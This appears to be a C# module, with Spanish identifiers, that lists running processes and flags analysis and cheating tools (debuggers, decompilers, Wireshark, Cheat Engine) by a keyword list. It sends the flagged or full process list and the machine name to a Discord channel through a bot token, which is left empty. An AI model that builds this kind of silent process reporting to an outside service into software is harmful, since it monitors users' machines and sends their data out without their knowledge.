using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace Security_DLL
{
    internal class Procesos
    {
        private static readonly string BotToken = "";
        private static readonly ulong CanalID = 0;

        public static async Task EnviarProcesosSospechosos()
        {
            try
            {
                await EnviarMensaje("🔍 **Buscando procesos sospechosos...**");

                var todosProcesos = ObtenerListaDeProcesos();

                var sospechosos = todosProcesos.Where(p =>
                    p.Nombre.ToLower().Contains("dump") ||
                    p.Nombre.ToLower().Contains("inject") ||
                    p.Nombre.ToLower().Contains("cheat") ||
                    p.Nombre.ToLower().Contains("crack") ||
                    p.Nombre.ToLower().Contains("debug") ||
                    p.Nombre.ToLower().Contains("hack") ||
                    p.Nombre.ToLower().Contains("exploit") ||
                    p.Nombre.ToLower().Contains("olly") ||
                    p.Nombre.ToLower().Contains("x64") ||
                    p.Nombre.ToLower().Contains("x32") ||
                    p.Nombre.ToLower().Contains("ida") ||
                    p.Nombre.ToLower().Contains("wireshark") ||
                    p.Nombre.ToLower().Contains("process hacker") ||
                    p.Nombre.ToLower().Contains("dnspy") ||
                    p.Nombre.ToLower().Contains("cheat engine") ||
                    p.Nombre.ToLower().Contains("de4dot") ||
                    p.Nombre.ToLower().Contains("ilspy") ||
                    p.Nombre.ToLower().Contains("dotpeek") ||
                    p.Nombre.ToLower().Contains("fiddler") ||
                    p.Nombre.ToLower().Contains("burpsuite") ||
                    p.Nombre.ToLower().Contains("ghidra") ||
                    p.Nombre.ToLower().Contains("radare2")
                ).ToList();

                if (sospechosos.Any())
                {
                    StringBuilder mensaje = new StringBuilder();
                    mensaje.AppendLine($"⚠️ **PROCESOS SOSPECHOSOS EN {Environment.MachineName}** ⚠️");
                    mensaje.AppendLine($"**Total:** {sospechosos.Count} procesos sospechosos");
                    mensaje.AppendLine($"**Hora:** {DateTime.Now}");
                    mensaje.AppendLine("```");

                    foreach (var proc in sospechosos.Take(20))
                    {
                        mensaje.AppendLine($"• {proc.Nombre} (PID: {proc.ID} | Memoria: {proc.Memoria}MB)");
                        if (!string.IsNullOrEmpty(proc.Ventana) && proc.Ventana != "Sin ventana" && proc.Ventana != "Acceso denegado")
                        {
                            mensaje.AppendLine($"  └─ Ventana: {proc.Ventana}");
                        }
                    }

                    if (sospechosos.Count > 20)
                    {
                        mensaje.AppendLine($"\n... y {sospechosos.Count - 20} procesos más");
                    }
                    mensaje.AppendLine("```");

                    await EnviarMensaje(mensaje.ToString());
                }
                else
                {
                    await EnviarMensaje($"✅ **No se detectaron procesos sospechosos en {Environment.MachineName}**");
                }
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error al obtener procesos: {ex.Message}");
            }
        }

        public static async Task EnviarTodosLosProcesos()
        {
            try
            {
                await EnviarMensaje("📊 **Obteniendo lista completa de procesos...**");

                var procesos = ObtenerListaDeProcesos();

                StringBuilder mensaje = new StringBuilder();
                mensaje.AppendLine($"📊 **LISTA DE PROCESOS**");
                mensaje.AppendLine($"**PC:** {Environment.MachineName}");
                mensaje.AppendLine($"**Total:** {procesos.Count} procesos");
                mensaje.AppendLine($"**Hora:** {DateTime.Now}");
                mensaje.AppendLine("```");
                mensaje.AppendLine($"{"Nombre",-25} {"PID",-8} {"Memoria MB",-12} {"Hilos",-6}");
                mensaje.AppendLine(new string('-', 55));

                foreach (var proc in procesos.Take(30))
                {
                    mensaje.AppendLine($"{proc.Nombre,-25} {proc.ID,-8} {proc.Memoria,-12} {proc.Hilos,-6}");
                }

                if (procesos.Count > 30)
                {
                    mensaje.AppendLine($"\n... y {procesos.Count - 30} procesos más");
                }
                mensaje.AppendLine("```");

                await EnviarMensaje(mensaje.ToString());
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static List<InfoProceso> ObtenerListaDeProcesos()
        {
            List<InfoProceso> listaProcesos = new List<InfoProceso>();

            try
            {
                var procesos = Process.GetProcesses();

                foreach (var proceso in procesos)
                {
                    try
                    {
                        var infoProceso = new InfoProceso
                        {
                            Nombre = proceso.ProcessName,
                            ID = proceso.Id,
                            Memoria = Math.Round(proceso.WorkingSet64 / 1024.0 / 1024.0, 2),
                            Hilos = proceso.Threads.Count,
                            Ventana = proceso.MainWindowTitle ?? "Sin ventana",
                            Respondiendo = proceso.Responding
                        };
                        listaProcesos.Add(infoProceso);
                    }
                    catch
                    {
                        var infoBasica = new InfoProceso
                        {
                            Nombre = proceso.ProcessName,
                            ID = proceso.Id,
                            Memoria = 0,
                            Hilos = 0,
                            Ventana = "Acceso denegado",
                            Respondiendo = false
                        };
                        listaProcesos.Add(infoBasica);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error obteniendo procesos: {ex.Message}");
            }

            return listaProcesos.OrderBy(p => p.Nombre).ToList();
        }

        private static async Task EnviarMensaje(string mensaje)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Add("Authorization", $"Bot {BotToken}");
                    var payload = new { content = mensaje };
                    string json = JsonConvert.SerializeObject(payload);
                    var content = new StringContent(json, Encoding.UTF8, "application/json");
                    string url = $"https://discord.com/api/v10/channels/{CanalID}/messages";
                    await client.PostAsync(url, content);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enviando mensaje: {ex.Message}");
            }
        }
    }

    internal class InfoProceso
    {
        public string Nombre { get; set; }
        public int ID { get; set; }
        public double Memoria { get; set; }
        public int Hilos { get; set; }
        public string Ventana { get; set; }
        public bool Respondiendo { get; set; }
    }
}